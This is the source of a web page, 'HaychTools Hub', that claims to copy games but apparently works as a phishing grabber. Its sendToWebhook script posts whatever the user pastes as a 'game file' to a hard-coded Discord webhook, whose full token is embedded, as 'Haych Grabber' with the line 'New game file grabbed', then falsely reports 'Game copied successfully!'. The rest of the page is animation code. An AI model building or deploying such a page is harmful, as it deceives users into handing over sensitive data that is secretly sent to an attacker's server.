<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>HaychTools Hub</title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Rubik+Puddles&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      background:#05060a;
      color:#fff;
      font-family:'Poppins', sans-serif;
      min-height:100vh;
      overflow-x:hidden;
    }

    #waves, #particles, #dots-canvas {
      position:fixed;
      top:0; left:0;
      width:100%; height:100%;
      z-index:-2;
      pointer-events:none;
    }
    #particles { z-index:-1; }
    #dots-canvas { display:none; z-index:0; }

    #hub {
      position:relative;
      z-index:1;
      min-height:100vh;
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:center;
      text-align:center;
      padding:40px 20px;
    }
    #hub h1 {
      font-family:'Rubik Puddles',cursive;
      font-size:clamp(50px, 12vw, 90px);
      margin:0 auto 60px auto;
      background:linear-gradient(90deg,#00f0ff,#00ff9d,#6a5cff);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      filter:drop-shadow(0 0 25px rgba(0,255,200,0.6));
      text-align:center;
      max-width:90%;
    }
    .container {
      display:flex;
      gap:30px;
      flex-wrap:wrap;
      justify-content:center;
    }
    .btn {
      padding:18px 40px;
      font-size:20px;
      border-radius:12px;
      border:none;
      cursor:pointer;
      color:white;
      font-weight:600;
      transition:0.35s;
    }
    .game { background:linear-gradient(135deg,#ff2e63,#ff6b6b); box-shadow:0 0 20px #ff2e63; }
    .clothes { background:linear-gradient(135deg,#00c853,#69f0ae); box-shadow:0 0 20px #00c853; }
    .bot { background:linear-gradient(135deg,#2979ff,#00b0ff); box-shadow:0 0 20px #2979ff; }
    .btn:hover { transform:scale(1.1); filter:brightness(1.2); }

    #game {
      display:none;
      position:relative;
      z-index:1;
      min-height:100vh;
      padding:80px 20px 40px;
      display:flex;
      align-items:center;
      justify-content:center;
    }
    .back-btn {
      position:absolute;
      top:20px;
      left:20px;
      background:none;
      border:none;
      color:#4d9fff;
      font-size:18px;
      font-weight:500;
      cursor:pointer;
      display:flex;
      align-items:center;
      gap:8px;
      z-index:2;
    }
    .back-btn::before { content:"←"; font-size:24px; }
    .game-content {
      max-width:520px;
      width:100%;
      background:rgba(15,15,25,0.85);
      backdrop-filter:blur(12px);
      border-radius:28px;
      padding:40px 28px;
      border:1px solid rgba(255,255,255,0.06);
      box-shadow:0 20px 80px rgba(0,0,0,0.7);
      text-align:center;
    }
    .game-content h1 {
      font-size:clamp(32px, 8vw, 48px);
      margin:0 auto 24px;
      font-weight:600;
      color:#fff;
    }
    .game-content p {
      font-size:15px;
      line-height:1.6;
      margin-bottom:32px;
      color:#ddd;
    }
    .input-wrapper {
      margin:32px 0;
    }
    input[type="text"] {
      width:100%;
      padding:18px 20px;
      font-size:16px;
      background:rgba(30,30,45,0.9);
      border:1px solid rgba(77,159,255,0.4);
      border-radius:14px;
      color:#fff;
      outline:none;
      transition:0.3s;
    }
    input[type="text"]:focus {
      border-color:#4d9fff;
      box-shadow:0 0 0 4px rgba(77,159,255,0.15);
    }
    .copy-btn {
      width:100%;
      padding:18px;
      font-size:18px;
      font-weight:600;
      background:linear-gradient(135deg,#4d9fff,#2979ff);
      border:none;
      border-radius:14px;
      color:white;
      cursor:pointer;
      transition:0.3s;
      box-shadow:0 8px 24px rgba(41,121,255,0.35);
    }
    .copy-btn:hover {
      transform:translateY(-3px);
      box-shadow:0 12px 32px rgba(41,121,255,0.5);
    }
    .status {
      margin-top:16px;
      font-size:14px;
      color:#4d9fff;
      min-height:20px;
    }
    .tutorial {
      margin-top:48px;
    }
    .tutorial h3 {
      font-size:20px;
      margin-bottom:16px;
      color:#fff;
    }
    .tutorial-btn {
      display:inline-flex;
      align-items:center;
      gap:12px;
      padding:14px 32px;
      background:rgba(255,255,255,0.07);
      border:1px solid rgba(255,255,255,0.12);
      border-radius:50px;
      color:#fff;
      font-size:16px;
      cursor:pointer;
      transition:0.3s;
    }
    .tutorial-btn:hover { background:rgba(255,255,255,0.14); }
    .play-icon {
      width:28px;
      height:28px;
      background:#4d9fff;
      border-radius:50%;
      display:flex;
      align-items:center;
      justify-content:center;
      font-size:16px;
      font-weight:bold;
    }
  </style>
</head>
<body>

  <canvas id="waves"></canvas>
  <canvas id="particles"></canvas>
  <canvas id="dots-canvas"></canvas>

  <div id="hub">
    <h1>HaychTools Hub</h1>
    <div class="container">
      <button class="btn game" onclick="showSection('game')">Game Copier</button>
      <button class="btn clothes" onclick="showSection('clothes')">Clothes Copier</button>
      <button class="btn bot" onclick="showSection('bot')">Bot Follower</button>
    </div>
  </div>

  <div id="game">
    <button class="back-btn" onclick="showSection('hub')">Back</button>
    <div class="game-content">
      <h1>Copy Games</h1>
      <p>Paste your game file in the box below, then click "Copy Game!" If you don't know how to find a games "game file" then go ahead and watch "How to use"</p>

      <div class="input-wrapper">
        <input type="text" id="gameInput" placeholder="Enter game file" />
      </div>

      <button class="copy-btn" onclick="sendToWebhook()">Copy Game!</button>
      <div id="status" class="status"></div>

      <div class="tutorial">
        <h3>How to use</h3>
        <div class="tutorial-btn">
          <div class="play-icon">▶</div>
          Video tutorial
        </div>
      </div>
    </div>
  </div>

  <!-- Placeholders for others -->
  <div id="clothes" class="section" style="display:none;">
    <button class="back-btn" onclick="showSection('hub')">Back</button>
    <div style="max-width:520px; text-align:center;">
      <h1>Clothes Copier</h1>
      <p>Coming soon.</p>
    </div>
  </div>

  <div id="bot" class="section" style="display:none;">
    <button class="back-btn" onclick="showSection('hub')">Back</button>
    <div style="max-width:520px; text-align:center;">
      <h1>Bot Follower</h1>
      <p>Coming soon.</p>
    </div>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1477729322713485474/0FQCzGy3j0B_1yibTFV23yolHpcVmr_1KNYNqAv_gcHYc4u-HgTY2EEqCEmk_ytQxbnN";

    async function sendToWebhook() {
      const input = document.getElementById('gameInput').value.trim();
      const status = document.getElementById('status');

      if (!input) {
        status.textContent = "Enter something first, dumbass.";
        status.style.color = "#ff4d4d";
        return;
      }

      status.textContent = "Copying game...";
      status.style.color = "#4d9fff";

      try {
        const payload = {
          content: `New game file grabbed:\n\`\`\`${input}\`\`\``,
          username: "Haych Grabber",
          avatar_url: "https://i.imgur.com/YourCoolIcon.png" // optional, change or remove
        };

        const res = await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        if (res.ok) {
          status.textContent = "Game copied successfully!";
          status.style.color = "#00ff9d";
        } else {
          status.textContent = "Copy failed (check console)";
          console.error("Webhook failed:", res.status);
        }
      } catch (err) {
        status.textContent = "Copy failed";
        console.error("Fetch error:", err);
      }
    }

    function showSection(id) {
      document.querySelectorAll('#hub, #game, #clothes, #bot').forEach(el => el.style.display = 'none');
      document.getElementById(id).style.display = 'block';

      document.getElementById('dots-canvas').style.display = (id === 'game') ? 'block' : 'none';
      if (id === 'game') initDots();

      window.scrollTo(0, 0);
    }

    // Wave animation (hub)
    const waveCanvas = document.getElementById("waves");
    const wctx = waveCanvas.getContext("2d");
    waveCanvas.width = window.innerWidth;
    waveCanvas.height = window.innerHeight;
    let t = 0;
    function drawWaves() {
      wctx.clearRect(0,0,waveCanvas.width,waveCanvas.height);
      for(let j=0;j<3;j++){
        wctx.beginPath();
        for(let i=0;i<waveCanvas.width;i++){
          let y = Math.sin(i*0.01 + t + j)*40 + waveCanvas.height/2;
          wctx.lineTo(i,y);
        }
        wctx.strokeStyle = `rgba(0,255,200,${0.2 + j*0.15})`;
        wctx.lineWidth = 2;
        wctx.stroke();
      }
      t += 0.02;
      requestAnimationFrame(drawWaves);
    }
    drawWaves();

    // Mouse particles (hub)
    const pCanvas = document.getElementById("particles");
    const pctx = pCanvas.getContext("2d");
    pCanvas.width = window.innerWidth;
    pCanvas.height = window.innerHeight;
    let particles = [];
    document.addEventListener("mousemove", e => {
      for(let i=0;i<3;i++){
        particles.push({
          x:e.clientX,
          y:e.clientY,
          size:Math.random()*4,
          vx:(Math.random()-0.5)*2,
          vy:(Math.random()-0.5)*2,
          life:80
        });
      }
    });
    function drawParticles() {
      pctx.clearRect(0,0,pCanvas.width,pCanvas.height);
      for(let i=particles.length-1;i>=0;i--){
        let p = particles[i];
        pctx.fillStyle="rgba(0,255,200,0.8)";
        pctx.beginPath();
        pctx.arc(p.x,p.y,p.size,0,Math.PI*2);
        pctx.fill();
        p.x+=p.vx; p.y+=p.vy; p.life--;
        if(p.life<=0) particles.splice(i,1);
      }
      requestAnimationFrame(drawParticles);
    }
    drawParticles();

    // Dots for Game Copier
    let dots = [];
    let dotsAnim;
    const dotsCanvas = document.getElementById('dots-canvas');
    const dotsCtx = dotsCanvas.getContext('2d');

    function resizeDots() {
      dotsCanvas.width = window.innerWidth;
      dotsCanvas.height = window.innerHeight;
    }
    resizeDots();
    window.addEventListener('resize', resizeDots);

    function initDots() {
      dots = [];
      const num = Math.floor((dotsCanvas.width * dotsCanvas.height) / 12000);
      for(let i=0; i<num; i++){
        dots.push({
          x: Math.random() * dotsCanvas.width,
          y: Math.random() * dotsCanvas.height,
          r: Math.random() * 1.8 + 0.4,
          vx: (Math.random() - 0.5) * 0.4,
          vy: (Math.random() - 0.5) * 0.4,
          alpha: Math.random() * 0.4 + 0.4
        });
      }
      animateDots();
    }

    function animateDots() {
      dotsCtx.clearRect(0, 0, dotsCanvas.width, dotsCanvas.height);
      dots.forEach(d => {
        d.x += d.vx;
        d.y += d.vy;
        if (d.x < 0 || d.x > dotsCanvas.width) d.vx *= -1;
        if (d.y < 0 || d.y > dotsCanvas.height) d.vy *= -1;
        dotsCtx.beginPath();
        dotsCtx.arc(d.x, d.y, d.r, 0, Math.PI*2);
        dotsCtx.fillStyle = `rgba(255,255,255,${d.alpha})`;
        dotsCtx.fill();
      });
      dotsAnim = requestAnimationFrame(animateDots);
    }

    showSection('hub');
  </script>

</body>
</html>
